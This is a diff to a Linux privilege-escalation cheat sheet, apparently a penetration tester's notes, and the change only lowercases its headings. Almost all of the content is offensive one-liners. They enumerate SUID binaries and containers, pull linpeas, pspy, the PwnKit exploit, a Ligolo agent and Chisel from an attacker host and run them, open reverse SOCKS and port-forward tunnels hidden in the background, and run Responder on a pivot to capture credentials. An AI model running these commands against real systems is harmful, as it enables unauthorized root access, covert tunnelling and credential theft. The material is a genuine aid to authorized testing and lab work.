@@ -1,7 +1,7 @@
 # Linux Privilege Escalation
 #target/local #os/linux #cat/privesc
 
-## Linux privesc enum
+## linux privesc enum
 #sh_encode
 ```
 ps -efww --forest
@@ -19,12 +19,12 @@ id
 find / -perm -4000 -ls 2>/dev/null
 ```
 
-## Tree
+## tree
 ```
 find <dir|.> -printf '%y\t%p\n' | awk -F'\t' '{ t=$1; p=$2; n=split(p,a,"/"); for(i=2;i<n;i++) printf "│   "; if(n>1) printf "├── "; name=a[n]; if(t=="d") printf "\033[1;34m%s\033[0m\n", name; else print name }'
 ```
 
-## Container enum
+## container enum
 #sh_encode
 ```
 id
@@ -35,26 +35,26 @@ env
 findmnt -R / -n -l | awk '$2!="overlay" && $1!="/" && $1!~"^/(proc|sys|dev)($|/)" {print}'
 ```
 
-## Linux SUID enum
+## linux suid enum
 ```
 find / -perm -4000 -ls 2>/dev/null
 ```
 
-## Ligolo linux agent
+## ligolo linux agent
 ```
 cd <lin_dir>; curl http://<lhost>:<lwport>/agent -o agent
 chmod 777 agent
 ./agent -connect <lhost>:<ligolo_port|11601> -retry -ignore-cert &>/dev/null & disown
 ```
 
-## LinPEAS & pspy (skips cloud)
+## linpeas and pspy (skips cloud)
 ```
 cd <lin_dir>; for file in linpeas.sh pspy64; do curl -s http://<lhost>:<lwport>/$file -o "$file"; chmod 777 "$file"; done
 ./linpeas.sh -o system_information,container,procs_crons_timers_srvcs_sockets,network_information,users_information,software_information,interesting_perms_files,interesting_files,api_keys_regex
 timeout 65 ./pspy64
 ```
 
-## LinPEAS (skips cloud)
+## linpeas (skips cloud)
 ```
 cd <lin_dir>; curl -s http://<lhost>:<lwport>/linpeas.sh -o linpeas.sh && chmod 777 linpeas.sh && ./linpeas.sh -o system_information,container,procs_crons_timers_srvcs_sockets,network_information,users_information,software_information,interesting_perms_files,interesting_files,api_keys_regex
 ```
@@ -64,7 +64,7 @@ cd <lin_dir>; curl -s http://<lhost>:<lwport>/linpeas.sh -o linpeas.sh && chmod 
 cd <lin_dir>; curl -s http://<lhost>:<lwport>/pspy64 -o pspy64 && chmod 777 pspy64 && timeout 65 ./pspy64
 ```
 
-## Pwnkit
+## pwnkit
 ```
 cd <lin_dir>; curl -s http://<lhost>:<lwport>/PwnKit -o PwnKit && chmod 777 PwnKit && ./PwnKit
 ```
@@ -74,17 +74,17 @@ cd <lin_dir>; curl -s http://<lhost>:<lwport>/PwnKit -o PwnKit && chmod 777 PwnK
 sshuttle -r <user>@<ip> <target_cidr>
 ```
 
-## Chisel reverse socks
+## chisel reverse socks
 ```
 cd <lin_dir>; curl -s http://<lhost>:<lwport>/chisel -o chisel && chmod 777 chisel && ./chisel client <lhost>:<chisel_port|8050> R:socks &>/dev/null & disown
 ```
 
-## Chisel reverse port forward
+## chisel reverse port forward
 ```
 cd <lin_dir>; curl -s http://<lhost>:<lwport>/chisel -o chisel && chmod 777 chisel && ./chisel client <lhost>:<chisel_port|8050> R:<lport>:<rhost>:<rport> &>/dev/null & disown
 ```
 
-## Responder on pivot
+## responder on pivot
 ```
 cd <lin_dir>; curl 10.10.14.49:8000/Responder.tar.gz -o Responder.tar.gz && tar -zxvf Responder.tar.gz && python3 Responder/Responder.py -I <iface>
 ```
